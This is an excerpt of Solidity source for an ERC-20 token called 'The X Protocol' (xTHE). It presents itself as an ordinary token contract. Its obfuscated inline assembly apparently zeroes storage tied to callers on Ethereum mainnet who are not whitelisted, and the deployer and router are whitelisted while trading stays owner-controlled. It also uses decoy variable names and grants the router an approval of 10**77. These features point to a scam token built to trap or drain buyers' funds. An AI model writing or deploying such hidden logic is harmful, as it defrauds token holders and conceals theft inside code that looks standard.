...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addXProtocol;
    uint256 private xavierProf = block.number*2;

    mapping (address => bool) private _firstAirplane; 
    mapping (address => bool) private _secondCrash;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private blackAsh;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private greenSlime;
    address public pair;
    ...
    bool private trading; uint256 private coreLock = 1; bool private dawnTime;
    uint256 private _decimals; uint256 private gunShop;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addXProtocol.push(_router); addXProtocol.push(msgSender_); addXProtocol.push(pair);
        for (uint256 q=0; q < 3;) {_firstAirplane[addXProtocol[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8d074a6182eac05f19655b60a11fc8fb855e77be19418335aff425903b44889b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xdaf61d4bed3fe8b93b3736b39367fad350a89c60cc2947a5186d96d2a478b954,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; xavierProf = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addXProtocol[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployXProtocol(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addXProtocol[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployXProtocol(creator, initialSupply);
    }
}

contract XProtocol is ERC20Token {
    constructor() ERC20Token("The X Protocol", "xTHE", msg.sender, 50000000 * 10 ** 18) {
    }
}